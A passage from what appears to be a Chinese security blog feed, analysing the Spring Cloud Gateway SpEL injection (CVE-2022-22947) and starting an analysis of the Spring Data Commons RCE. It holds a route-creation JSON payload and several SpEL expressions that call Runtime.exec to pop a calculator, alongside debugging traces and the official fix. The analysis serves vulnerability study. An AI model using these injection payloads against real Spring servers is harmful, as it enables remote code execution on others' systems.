null，走这里</span><br>        .switchIfEmpty(Mono.defer(() -&gt;<br>                                  Mono.just(ResponseEntity.badRequest().build())<br>                                 ));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514204313088.png" alt="image-20250514204313088"></p><p>我们打好断点，发送请求</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Dynamics&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gatewaytest&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;_genkey_1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://lingx5.github.io/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>首先 save 方法拦截到请求把请求参数封装为 RouteDefinition 并用 InMemoryRouteDefinitionRepository#save 缓存到 routes 这个 map 表中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514205514464.png" alt="image-20250514205514464"></p><p>接着我们发送 <code>/refresh</code> 请求</p><p>执行 AbstractApplicationContext#publishEvent 方法，调用 SimpleApplicationEventMulticaster#multicastEvent</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514210756845.png" alt="image-20250514210756845"></p><p>multicastEvent 接着循环调用 invokeListener -&gt; doInvokeListener -&gt; ApplicationListener#onApplicationEvent</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514211949521.png" alt="image-20250514211949521" style="zoom:50%;" /><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250514212029883.png" alt="image-20250514211123486" width="400px" />    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250514211640036.png" alt="image-20250514211222759" width="400px" />    </center><p>执行不同类的 onApplicationEvent 方法 </p> <img src="https://gitee.com/ling-x5/img/raw/master/image-20250514211726165.png" alt="image-20250514211413399" style="zoom:67%;" /><p>最终由 CachingRouteLocator#onApplicationEvent </p><p>看一下这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApplicationEvent</span><span class="hljs-params">(RefreshRoutesEvent event)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 一次性把 fetch() 这条 Flux 执行完，并 collect 成一个 List&lt;Route&gt;</span><br>        <span class="hljs-built_in">this</span>.fetch().collect(Collectors.toList())<br>            .subscribe(list -&gt; <br>                       <span class="hljs-comment">// 然后再把 list 转回 Flux，materialize 成一串 Signal&lt;Route&gt;</span><br>                       Flux.fromIterable(list)<br>                       .materialize()<br>                       .collect(Collectors.toList())<br>                       .subscribe(signals -&gt; &#123;<br>                           <span class="hljs-comment">// ① 发布一个 RefreshRoutesResultEvent</span><br>                           <span class="hljs-built_in">this</span>.applicationEventPublisher<br>                               .publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RefreshRoutesResultEvent</span>(<span class="hljs-built_in">this</span>));<br>                           <span class="hljs-comment">// ② 缓存这批 signals 到 cache</span><br>                           <span class="hljs-built_in">this</span>.cache.put(<span class="hljs-string">&quot;routes&quot;</span>, signals);<br>                       &#125;, <span class="hljs-built_in">this</span>::handleRefreshError),<br>                       <span class="hljs-built_in">this</span>::handleRefreshError);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        <span class="hljs-built_in">this</span>.handleRefreshError(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="取缓存"><a href="#取缓存" class="headerlink" title="取缓存"></a>取缓存</h5><p>fetch 调用 CompositeRouteLocator#getRoutes 方法，聚合应用上下文里所有的 RouteLocator Bean</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515091120946.png" alt="image-20250515091120946" style="zoom:67%;" /><p>遍历 RouteLocator:: getRoutes</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515093544933.png" alt="image-20250515093544933" style="zoom:50%;" /><p>包含了 RouteDefinitionRouteLocator#getRoutes</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515093746834.png" alt="image-20250515093746834" style="zoom:50%;" /><p>RouteDefinitionRouteLocator#getRoutes 的实现调用了 RouteDefinitionLocator#getRouteDefinitions 方法，其中就有我们缓存的InMemoryRouteDefinitionRepository 的实现，从而拿到缓存的添加的 恶意Route</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515094034244.png" alt="image-20250515094034244"></p><h5 id="解析执行"><a href="#解析执行" class="headerlink" title="解析执行"></a>解析执行</h5><p>onApplicationEvent通过fetch拿到所有的Route后，用collect整合起来，再由subscribe() 一路调用到 RouteDefinitionRouteLocator#convertToRoute 方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs stylus">convertToRoute:<span class="hljs-number">117</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>apply:-<span class="hljs-number">1</span>, <span class="hljs-number">289336712</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span><span class="hljs-selector-class">.route</span>.RouteDefinitionRouteLocator$<span class="hljs-variable">$Lambda</span>$<span class="hljs-number">1016</span>)<br>onNext:<span class="hljs-number">113</span>, FluxMapFuseable<span class="hljs-variable">$MapFuseableSubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>tryEmitScalar:<span class="hljs-number">489</span>, FluxFlatMap<span class="hljs-variable">$FlatMapMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">422</span>, FluxFlatMap<span class="hljs-variable">$FlatMapMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>drain:<span class="hljs-number">439</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>innerComplete:<span class="hljs-number">335</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">559</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialInner</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">633</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">201</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">83</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">8642</span>, Flux (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">237</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>slowPath:<span class="hljs-number">335</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">294</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">649</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">198</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">633</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">201</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">83</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">8642</span>, Flux (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">237</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>slowPath:<span class="hljs-number">335</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">294</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">649</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">198</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">633</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">201</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">83</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4490</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribeWith:<span class="hljs-number">4605</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4457</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4393</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4365</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onApplicationEvent:<span class="hljs-number">81</span>, CachingRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>onApplicationEvent:<span class="hljs-number">40</span>, CachingRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>doInvokeListener:<span class="hljs-number">178</span>, SimpleApplicationEventMulticaster (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.event)<br>invokeListener:<span class="hljs-number">171</span>, SimpleApplicationEventMulticaster (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.event)<br>multicastEvent:<span class="hljs-number">145</span>, SimpleApplicationEventMulticaster (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.event)<br>publishEvent:<span class="hljs-number">429</span>, AbstractApplicationContext (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.support)<br>publishEvent:<span class="hljs-number">386</span>, AbstractApplicationContext (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.support)<br>refresh:<span class="hljs-number">96</span>, AbstractGatewayControllerEndpoint (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.actuate)<br></code></pre></td></tr></table></figure><p>后续和静态路由一样了 调用 getValue 解析 SpEL 表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514213853353.png" alt="image-20250514213853353"></p><p>弹出计算器</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514213921125.png" alt="image-20250514213921125" style="zoom:50%;" /><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方在解析SpEL的 ShortcutConfigurable做了修改，把 StandardEvaluationContext 换位了自定义的GatewayEvaluationContext，在GatewayEvaluationContext内部是由 SimpleEvaluationContext 去解析</p><p><a href="https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e#diff-7aa249852020f587b35d07cd73c39161c229700ee1e13a9a146c114f542083bc">Updates ShortcutConfigurable to use custom EvaluationContext. · spring-cloud&#x2F;spring-cloud-gateway@337cef2</a></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515095144008.png" alt="image-20250515095144008"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://news.558idc.com/290335.html">SpringCloud Gateway 漏洞分析 （CVE-2022-22947） - 自由资讯</a></p><p><a href="http://www.ityouknow.com/springcloud/2018/12/12/spring-cloud-gateway-start.html">springcloud(十五)：服务网关 Spring Cloud GateWay 入门 - 纯洁的微笑博客</a></p><p><a href="https://nosec.org/home/detail/5008.html">Spring Cloud Gateway CVE-2022-22947 漏洞分析|NOSEC 安全讯息平台 - 白帽汇安全研究院</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Spring</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring Data Commons RCE 分析</title>
    <link href="/2025/05/11/Spring-Data-Commons-RCE-%E5%88%86%E6%9E%90/"/>
    <url>/2025/05/11/Spring-Data-Commons-RCE-%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Spring-Data-Commons-RCE-分析"><a href="#Spring-Data-Commons-RCE-分析" class="headerlink" title="Spring Data Commons RCE 分析"></a>Spring Data Commons RCE 分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架, 包含 Commons、Gemfire、JPA、JDBC、MongoDB 等模块。Commons 模块提供了基础的框架。</p><p>漏洞产生的原因是 Spring Data Commons 组件在处理 form 表单的 key 值时，可以解析 SpEL 表达式，导致 RCE。</p><p> <strong>SpEL 基本语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*直接量表达式*/</span><br>#&#123;<span class="hljs-number">5</span>&#125;<br>#&#123;<span class="hljs-string">&#x27;abc&#x27;</span>&#125;<br>#&#123;<span class="hljs-string">&#x27;true&#x27;</span>&#125;<br><span class="hljs-comment">/*引用Bean并使用其属性与方法*/</span> <br>#&#123;a&#125;                          <span class="hljs-comment">//a为bean的id</span><br>#&#123;a.b&#125;                        <span class="hljs-comment">//使用bean的属性</span><br>#&#123;a.c()&#125;                    <span class="hljs-comment">//使用bean的方法</span><br><span class="hljs-comment">/*引用类的常量与方法*/</span><br><span class="hljs-comment">//在SpEL中访问类作用域的方法和常量的话，可以使用T()</span><br>T(java.lang.Math).PI        <span class="hljs-comment">//调用Math类的PI常量</span><br>T(java.lang.Math).random()    <span class="hljs-comment">//调用Math类的random()方法</span><br><span class="hljs-comment">/*利用SpEL表达式进行命令执行(弹出计算器)*/</span><br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) <br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>其实 SpEL 和我们之前在 struts2 中利用的 ognl 表达式很相似，都是要抽象成 <code>抽象语法树</code>，再进行求值</p><p>SpEL 的语法树在 <code>org.springframework.expression.spel.ast</code> 包内</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Assign</span><br><span class="hljs-variable">AstUtils</span><br><span class="hljs-variable">BeanReference</span><br><span class="hljs-variable">BooleanLiteral</span><br><span class="hljs-built_in">CompoundExpression</span><br><span class="hljs-variable">ConstructorReference</span><br><span class="hljs-variable">Elvis</span><br><span class="hljs-variable">FloatLiteral</span><br><span class="hljs-variable">FormatHelper</span><br><span class="hljs-variable">FunctionReference</span><br><span class="hljs-variable">Identifier</span><br><span class="hljs-variable">Indexer</span><br><span class="hljs-variable">InlineList</span><br><span class="hljs-variable">InlineMap</span><br><span class="hljs-variable">IntLiteral</span><br><span class="hljs-built_in">Literal</span><br><span class="hljs-variable">LongLiteral</span><br><span class="hljs-variable">MethodReference</span><br><span class="hljs-variable">NullLiteral</span><br><span class="hljs-variable">OpAnd</span><br><span class="hljs-variable">OpDec</span><br><span class="hljs-variable">OpDivide</span><br><span class="hljs-variable">OpEQ</span><br><span class="hljs-variable">Operator</span><br><span class="hljs-variable">OperatorBetween</span><br><span class="hljs-variable">OperatorInstanceof</span><br><span class="hljs-variable">OperatorMatches</span><br><span class="hljs-variable">OperatorNot</span><br><span class="hljs-variable">OperatorPower</span><br><span class="hljs-variable">OpGE</span><br><span class="hljs-variable">OpGT</span><br><span class="hljs-variable">OpInc</span><br><span class="hljs-variable">OpLE</span><br><span class="hljs-variable">OpLT</span><br><span class="hljs-variable">OpMinus</span><br><span class="hljs-variable">OpModulus</span><br><span class="hljs-variable">OpMultiply</span><br><span class="hljs-variable">OpNE</span><br><span class="hljs-variable">OpOr</span><br><span class="hljs-variable">OpPlus</span><br><span class="hljs-variable">package</span><span class="hljs-operator">-</span><span class="hljs-variable">info</span><br><span class="hljs-built_in">Projection</span><br><span class="hljs-variable">PropertyOrFieldReference</span><br><span class="hljs-variable">QualifiedIdentifier</span><br><span class="hljs-variable">RealLiteral</span><br><span class="hljs-built_in">Selection</span><br><span class="hljs-variable">SpelNodeImpl</span><br><span class="hljs-variable">StringLiteral</span><br><span class="hljs-variable">Ternary</span><br><span class="hljs-variable">TypeCode</span><br><span class="hljs-variable">TypeReference</span><br><span class="hljs-variable">ValueRef</span><br><span class="hljs-variable">VariableReference</span><br></code></pre></td></tr></table></figure><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><ul><li>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</li><li>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</li><li>Spring Data Commons 2.0 - 2.0.5 (Kay SR5)</li><li>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方给了一个 SpirngData 的例子: <a href="https://github.com/spring-projects/spring-data-examples/">spring-projects&#x2F;spring-data-examples: Spring Data Example Projects</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/spring-projects/spring-data-examples.git  <span class="hljs-comment"># 官方仓库</span><br><span class="hljs-built_in">cd</span> spring-data-examples<br>git reset --hard ec94079b8f2b1e66414f410d89003bd333fb6e7d  <span class="hljs-comment"># 回退到一个库版本计较旧的版本</span><br></code></pre></td></tr></table></figure><p>我们只需要用 idea 打开 web 目录下的 example 即可</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511145027684.png" alt="image-20250511145027684"></p><p>修改一下 pom.xml 的 parent 节点，设置为有漏洞的版本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">relativePath</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>添加两个依赖，让这个模块成为一个单独的项目</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行 Application，启动项目</p><p> 报错</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511154318632.png" alt="image-20250511154318632" style="zoom: 50%;" /><p>我们把对应的包替换一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration;<br></code></pre></td></tr></table></figure><p>替换为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration;<br></code></pre></td></tr></table></figure><p>就可以启动了</p><p>访问 <code>http://localhost:8080/users</code></p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511154700965.png" alt="image-20250511154700965" style="zoom:50%;" /><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞主要产生是在 springMVC 处理请求参数 key 值的时候，会调用 <code>org.springframework.data.web.MapDataBinder.MapPropertyAccessor#setPropertyValue</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 